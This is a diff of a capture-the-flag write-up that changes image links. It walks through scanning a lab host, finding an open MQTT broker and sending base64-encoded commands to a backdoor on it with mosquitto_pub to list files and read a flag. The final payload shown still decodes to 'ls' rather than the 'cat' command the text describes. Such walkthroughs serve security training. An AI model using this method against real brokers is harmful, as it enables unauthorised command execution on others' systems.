@@ -7,7 +7,8 @@ IP address 10.10.59.207
 ```bash
 nmap -sC -sV 10.10.59.207 -T5
 ```
-![[Pasted image 20240610203505.png]]
+![Pasted image 20240610203505](https://github.com/BGhoster/Write-Ups/assets/43526966/ca00651b-e738-4135-862a-666c2e472450)
+
 All standard ports are filtered with the Nmap scan. Switching to scanning all ports to see which ones are open.
 ```bash
 nmap -p- 10.10.59.207
@@ -16,14 +17,15 @@ After the scan we see that the only port open is1883.
 ### open ports
 - 1883 (mqtt)
 
-![[Pasted image 20240610204254.png]]
+![Pasted image 20240610204254](https://github.com/BGhoster/Write-Ups/assets/43526966/e99838e9-9f23-4bf9-ae6d-7cbe9a895adc)
+
 
 # What is mosquitto
 
 > [!NOTE]
 > The MQTT protocol provides a lightweight method of carrying out messaging using a publish/subscribe model. This makes it suitable for Internet of Things messaging such as with low power sensors or mobile devices such as phones, embedded computers or microcontrollers.
 > https://www.eginnovations.com/documentation/Mosquitto-MQTT/What-is-Mosquitto-MQTT.htm
-![[Pasted image 20240610213041.png]]
+![Pasted image 20240610213041](https://github.com/BGhoster/Write-Ups/assets/43526966/5096de07-30e5-4182-9d96-0470ca088db7)
 
 ## Commands we will need
 
@@ -57,7 +59,8 @@ Publishing a message with test returns a base64 encoded string. Decoding the str
 ```python
 SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=
 ```
-![[Pasted image 20240610211410.png]]
+![Pasted image 20240610211410](https://github.com/BGhoster/Write-Ups/assets/43526966/fe7caf38-5323-4335-bc45-e03c112c5538)
+
 ## Formatting the command
 After fixing the issue we need to encode this command in base64.
 ```python
@@ -66,7 +69,8 @@ After fixing the issue we need to encode this command in base64.
 ```python
 eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAibHMifQ==
 ```
-![[Pasted image 20240610211931.png]]
+![Pasted image 20240610211931](https://github.com/BGhoster/Write-Ups/assets/43526966/66ab2cca-635f-4f0a-ba72-ba33063f243a)
+
 ## Catting the flag
 Now that we see what the flag filename is called let's cat the flag. We will follow the same format. Change the command to cat flag.txt, base64 encode the message, and than publish it.
 ```bash
@@ -79,7 +83,8 @@ eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIs
 mosquitto_pub -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -h 10.10.59.207 -m "eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAibHMifQo="
 ```
 
-![[Pasted image 20240610212131.png]]
+![Pasted image 20240610212131](https://github.com/BGhoster/Write-Ups/assets/43526966/274e3ee7-25ec-46c0-a1b4-df43ad76b920)
+
 # Resources
 https://book.hacktricks.xyz/network-services-pentesting/1883-pentesting-mqtt-mosquitto
 https://www.eginnovations.com/documentation/Mosquitto-MQTT/What-is-Mosquitto-MQTT.htm
